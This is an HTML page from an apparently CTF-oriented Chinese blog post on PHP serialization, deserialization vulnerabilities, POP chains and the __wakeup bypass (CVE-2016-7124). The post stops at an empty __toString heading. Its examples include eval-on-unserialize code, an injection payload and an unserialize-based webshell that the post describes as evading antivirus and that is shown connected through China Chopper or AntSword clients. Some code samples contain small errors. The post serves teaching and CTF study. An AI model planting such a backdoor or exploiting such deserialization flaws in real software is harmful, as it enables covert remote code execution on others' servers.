@@ -1,0 +1,326 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>序列化与反序列化 | Sakura</title><meta name="author" content="0Su-Sakura"><meta name="copyright" content="0Su-Sakura"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考文献: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45521281&#x2F;article&#x2F;details&#x2F;105891381 序列化与反序列化序列化(serialize)O:6:”person”:2:{s:4:”name”;s:3:”cx”;s:3:”age”;i:19;}  O代表结构类型为类 6表示类名长度 person表示类名 2表示类的属性个数 s表示属性名的类型为字符串 4表示属性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="序列化与反序列化">
+<meta property="og:url" content="https://0su-sakura.github.io/uncategorized/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Sakura">
+<meta property="og:description" content="参考文献: https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45521281&#x2F;article&#x2F;details&#x2F;105891381 序列化与反序列化序列化(serialize)O:6:”person”:2:{s:4:”name”;s:3:”cx”;s:3:”age”;i:19;}  O代表结构类型为类 6表示类名长度 person表示类名 2表示类的属性个数 s表示属性名的类型为字符串 4表示属性">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-03-28T11:58:37.983Z">
+<meta property="article:modified_time" content="2023-03-30T13:42:13.663Z">
+<meta property="article:author" content="0Su-Sakura">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://0su-sakura.github.io/uncategorized/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '序列化与反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-30 21:42:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Sakura"><span class="site-name">Sakura</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">序列化与反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-28T11:58:37.983Z" title="发表于 2023-03-28 19:58:37">2023-03-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-30T13:42:13.663Z" title="更新于 2023-03-30 21:42:13">2023-03-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="序列化与反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>参考文献: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/105891381">https://blog.csdn.net/qq_45521281/article/details/105891381</a></p>
+<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><h3 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化(serialize)"></a>序列化(serialize)</h3><p>O:6:”person”:2:{s:4:”name”;s:3:”cx”;s:3:”age”;i:19;}</p>
+<ul>
+<li><code>O</code>代表结构类型为类</li>
+<li><code>6</code>表示类名长度</li>
+<li><code>person</code>表示类名</li>
+<li><code>2</code>表示类的属性个数</li>
+<li><code>s</code>表示属性名的类型为字符串</li>
+<li><code>4</code>表示属性名长度</li>
+<li><code>name</code>表示属性名</li>
+<li><code>s</code>表示属性的类型为字符串</li>
+<li><code>3</code>表示属性长度</li>
+<li><code>cx</code>表示属性值</li>
+</ul>
+<p><img src="https://ask.qcloudimg.com/http-save/yehe-9957789/0fe95614a3e1b1fc790db3582d82dc77.png?imageView2/2/w/2560/h/7000" alt="img"></p>
+<?php
+
+​    class Ctf{
+
+​    	public $flag='flag{****}';
+​    	public $name='cxk';
+​    	public $age='10';
+​	}
+​	$ctfer=new Ctf();     //实例化一个对象
+​	$ctfer->flag='flag{adedyui}';
+​	$ctfer->name='Sch0lar';
+​	$ctfer->age='18'
+​    echo serialize($ctfer);
+?>
+
+<p>&#x2F;&#x2F;输出结果</p>
+<p>O:3:”Ctf”:3{s:4:”flag”;s:13:”flag{abedyui}”;s:4:”name”;s:7:”Sch0lar”;s:3:”age”;s:2:”18”;}<br>O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示<br>3代表类的名字长三个字符<br>Ctf 是类名<br>3代表这个类里有三个属性(三个变量)<br>s代表字符串<br>4代表属性名的长度<br>flag是属性名<br>s:13:”flag{adedyui}” 字符串，属性长度，属性值</p>
+<p>serialize() 函数会检查类中是否存在一个魔术方法  <code>__sleep()</code>。如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作。</p>
+<p>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</p>
+<?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+        public function __sleep(){
+            return array('flag','age');
+        }
+    }
+    $ctfer=new Ctf();
+    $ctfer->flag='flag{abedyui}';
+    $ctfer->name='Sch0lar';
+    $ctfer->age='18'
+    echo serialize($ctfer);
+?>
+
+<p><em>&#x2F;&#x2F; 输出结果</em></p>
+<p> O:3:”Ctf”:2:{s:4:”flag”;s:13:”flag{abedyui}”;s:3:”age”;s:2:”18”;}</p>
+<p>即<code>__sleep()</code>方法使 flag age 属性序列化，而name并没有被序列化。所以可以在<code>__sleep()</code>方法里决定哪些属性被序列化。</p>
+<h3 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化(unserialize)"></a>反序列化(unserialize)</h3><p>反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去</p>
+<?php
+    class Ctf{
+        public $flag='flag{}';
+        public $name='cxk';
+        public $age='10';
+    }
+    $ctfer=new Ctf();     //实例化一个对象
+    $ctfer->flag='flag{adedyui}';
+    $ctfer->name='Sch0lar';
+    $ctfer->age='18'
+    $str=serialize($ctfer);
+    echo '<pre>';
+    var_dump(unserialize($str))
+?>
+
+<p>&#x2F;&#x2F;输出结果<br>object(Ctf)#2 (3) {<br>    [“flag”]&#x3D;&gt;<br>    string(13) “flag{abedyui}”<br>    [“name”]&#x3D;&gt;<br>    string(7) “Sch0lar”<br>    [“age”]&#x3D;&gt;<br>    string(2) “18”<br>}</p>
+<p><strong>与序列化函数类似，unserialize()会检查类中是否存在一个<code>__wakeup</code>魔术方法</strong><br><strong>如果存在则会先调用<code>__wakeup()</code>方法，再进行序列化</strong></p>
+<p><strong>可以在<code>__wakeup()</code>方法中对属性进行初始化、赋值或者改变。</strong></p>
+<?php
+    class Ctf{
+        public $flag='flag{****}';
+        public $name='cxk';
+        public $age='10';
+        public function __wakeup(){
+            $this->flag='no flag';        //在反序列化时，flag属性将被改变为“no flag”
+        }
+    }
+    $ctfer=new Ctf();     //实例化一个对象
+    $ctfer->flag='flag{adedyui}';
+    $ctfer->name='Sch0lar';
+    $ctfer->age='18'
+    $str=serialize($ctfer);
+echo '<pre>';
+var_dump(unserialize($str));
+
+?>
+
+<p>反序列化之前重新给flag属性赋值</p>
+<p>&#x2F;&#x2F; 输出结果<br>object(Ctf)#2 (3) {<br>    [“flag”]&#x3D;&gt;<br>    string(13) “no flag”<br>    [“name”]&#x3D;&gt;<br>    string(7) “Sch0lar”<br>    [“age”]&#x3D;&gt;<br>    string(2) “18”<br>}</p>
+<h3 id="反序列化POP链"><a href="#反序列化POP链" class="headerlink" title="反序列化POP链"></a>反序列化POP链</h3><p>unserialize()反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。<br>当反序列化参数可控时，可能会产生PHP反序列化漏洞。<br>在反序列化中，我们所能控制的数据就是对象中的各个属性值，所以在PHP的反序列化中有一种漏洞利用方法叫做 “面向属性编程”，面向对象编程从一定程度上来说，就是完成类与类之间的调用。POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”<br>在PHP中，“组件”就是那些魔术方法（如：wakeup()或destruct）</p>
+<p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似</p>
+<h5 id="都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。"><a href="#都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。" class="headerlink" title="都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。"></a>都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</h5><p>魔术方法是<code>PHP</code>面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，你可以把它们理解为钩子，利用模式方法可以轻松实现<code>PHP</code>面向对象中重载（<code>Overloading</code>即动态创建类属性和方法）</p>
+<p>__construct() 当对象创建（new）时会自动调用。但在 unserialize() 时是不会自动调用的。</p>
+<p>__destruct() 当一个对象销毁（反序列化）时被调用</p>
+<p>__toString() 当一个对象被当作一个字符串使用时被调用</p>
+<p>__sleep() 在对象在被序列化之前立即运行</p>
+<p>__wakeup() 将在序列化之后立即被调用</p>
+<p><code>__call</code>调用对象不存在的时</p>
+<p><code>__get()</code>调用私有属性时</p>
+<p><code>__set()</code>读取不可访问或者不存在属性时被调用</p>
+<p><code>__isset()</code>对不可访问或者不存在属性调用<code>isset()</code>或者<code>empty()</code>是被调用</p>
+<p><code>__unset()</code>对不可访问或不存在的属性进行<code>unset()</code>时被调用</p>
+<p>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
+<h3 id="绕过魔术方法的反序列化漏洞"><a href="#绕过魔术方法的反序列化漏洞" class="headerlink" title="绕过魔术方法的反序列化漏洞"></a>绕过魔术方法的反序列化漏洞</h3><p>一个CVE漏洞，编号CVE-2016-7124</p>
+<p>先介绍下两个魔法函数wakeup() 和sleep()</p>
+<p>unserialize() 执行时会检查是否存在一个 wakeup() 方法。 如果存在，则会先调用 wakeup方法，预先准备对象需要的资源。wakeup()经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br>sleep()则相反，是用在序列化一个对象时被调用</p>
+<h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4><p>将在序列化之后立即被调用<br>当序列化字符串表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS4zMDAxLm5ldC9pbWFnZXMvMjAxOTExMjcvMTU3NDg1MjE4MV81ZGRlNTY1NTY1NzRkLnBuZyFzbWFsbA?x-oss-process=image/format,png" alt="img"></p>
+<p>首先我们本地进行序列化后得到字符串:</p>
+<p>O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p>
+<p>把1写成2 达到绕过wakeup()效果 拿到flag，这是因为<strong>当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</strong>，</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZS4zMDAxLm5ldC9pbWFnZXMvMjAxOTExMjcvMTU3NDg1MjIzMV81ZGRlNTY4NzY0ZDViLnBuZyFzbWFsbA?x-oss-process=image/format,png" alt="img"></p>
+<p><strong>图中序列化后字符串中表示对象属性个数为2，而真实的类中实际只有1个属性，这是就会跳过__wakeup的执行</strong></p>
+<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>当一个对象被销毁时被调用</p>
+<h5 id="示例一："><a href="#示例一：" class="headerlink" title="示例一："></a>示例一：</h5><?php 
+
+class Example {
+
+​    var $var = '';
+
+​    function __destruct() {_
+
+​        eval($this->var);
+
+​    } 
+
+} 
+
+unserialize($_GET['a']);
+
+ ?><p>　</p>
+<p>要让<code>eval($this-&gt;var);</code>执行我们的恶意代码，我们就需要修改属性<code>$var</code>的值。接下来构造序列化数据：</p>
+<p>$obj &#x3D; new Example();</p>
+<p>$obj-&gt;var&#x3D;’phpinfo()’; </p>
+<p>var_dump(serialize($obj));</p>
+<p>得</p>
+<p>O:7:”Example”:1:{s:3:”var”;s:9:”phpinfo()”;}</p>
+<p><strong>反序列化后在脚本运行结束时就会调用__destruct函数，同时会覆盖$var变量输出执行eval(phpinfo())：</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20200502172759201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h5 id="示例二（连菜刀-或蚁剑-、反序列化免杀后门）："><a href="#示例二（连菜刀-或蚁剑-、反序列化免杀后门）：" class="headerlink" title="示例二（连菜刀(或蚁剑)、反序列化免杀后门）："></a>示例二（连菜刀(或蚁剑)、反序列化免杀后门）：</h5><?php
+class A{
+    var $test = "demo";
+    function __destruct(){
+        @eval($this->test);
+    }
+}
+$test = $_POST['test'];
+$len = strlen($test)+1;
+$pp = "O:1:\"A\":1:{s:4:\"test\";s:".$len.":\"".$test.";\";}"; // 构造序列化对象，用我们POST传过去的命令代码字符串覆盖$test="demo"，从而执行恶意命令。
+$test_unser = unserialize($pp); // 反序列化同时触发_destruct函数
+?>
+
+<p><img src="https://img-blog.csdnimg.cn/20200502174112634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>以上代码就相当于<code>&lt;?php @eval($_POST[&#39;test&#39;]);?&gt;</code></p>
+<p>直接菜刀(或蚁剑)链接</p>
+<p><img src="https://img-blog.csdnimg.cn/20200502174727404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200502174216214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/2020050217423396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>此木马毕竟是跟正常文件太像，所以免杀效果很不错。</p>
+<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0Su-Sakura.github.io">0Su-Sakura</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0su-sakura.github.io/uncategorized/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/">https://0su-sakura.github.io/uncategorized/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0Su-Sakura.github.io" target="_blank">Sakura</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/uncategorized/PHP%E4%B8%ADMD5%E5%92%8Csha1%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" title="PHP中MD5和sha1绕过方式总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PHP中MD5和sha1绕过方式总结</div></div></a></div><div class="next-post pull-right"><a href="/%E4%B8%80%E7%BA%A7%E5%88%86%E7%B1%BB/%E4%BA%8C%E7%BA%A7%E5%88%86%E7%B1%BB/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/" title="php伪协议总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php伪协议总结</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0Su-Sakura</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-serialize"><span class="toc-number">1.0.1.</span> <span class="toc-text">序列化(serialize)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-unserialize"><span class="toc-number">1.0.2.</span> <span class="toc-text">反序列化(unserialize)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE"><span class="toc-number">1.0.3.</span> <span class="toc-text">反序列化POP链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%83%BD%E6%98%AF%E4%BB%8E%E7%8E%B0%E6%9C%89%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E5%AF%BB%E6%89%BE%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81%E6%88%96%E8%80%85%E6%8C%87%E4%BB%A4%E8%B0%83%E7%94%A8%EF%BC%8C%E7%84%B6%E5%90%8E%E6%A0%B9%E6%8D%AE%E9%9C%80%E6%B1%82%E6%9E%84%E6%88%90%E4%B8%80%E7%BB%84%E8%BF%9E%E7%BB%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E3%80%82%E5%9C%A8%E6%8E%A7%E5%88%B6%E4%BB%A3%E7%A0%81%E6%88%96%E8%80%85%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E5%90%8E%E5%B0%B1%E8%83%BD%E5%A4%9F%E4%BD%BF%E7%94%A8%E8%BF%99%E4%B8%80%E7%BB%84%E8%B0%83%E7%94%A8%E9%93%BE%E5%81%9A%E4%B8%80%E4%BA%9B%E5%B7%A5%E4%BD%9C%E4%BA%86%E3%80%82"><span class="toc-number">1.0.3.0.1.</span> <span class="toc-text">都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.4.</span> <span class="toc-text">绕过魔术方法的反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">__wakeup()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">__destruct()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%B8%80%EF%BC%9A"><span class="toc-number">1.0.4.2.1.</span> <span class="toc-text">示例一：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BA%8C%EF%BC%88%E8%BF%9E%E8%8F%9C%E5%88%80-%E6%88%96%E8%9A%81%E5%89%91-%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8%EF%BC%89%EF%BC%9A"><span class="toc-number">1.0.4.2.2.</span> <span class="toc-text">示例二（连菜刀(或蚁剑)、反序列化免杀后门）：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#toString-NaN"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">__toString()</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/uncategorized/linux%E5%91%BD%E4%BB%A4/" title="无题">无题</a><time datetime="2024-01-11T12:40:34.825Z" title="发表于 2024-01-11 20:40:34">2024-01-11</time></div></div><div class="aside-list-item no-cover"><div 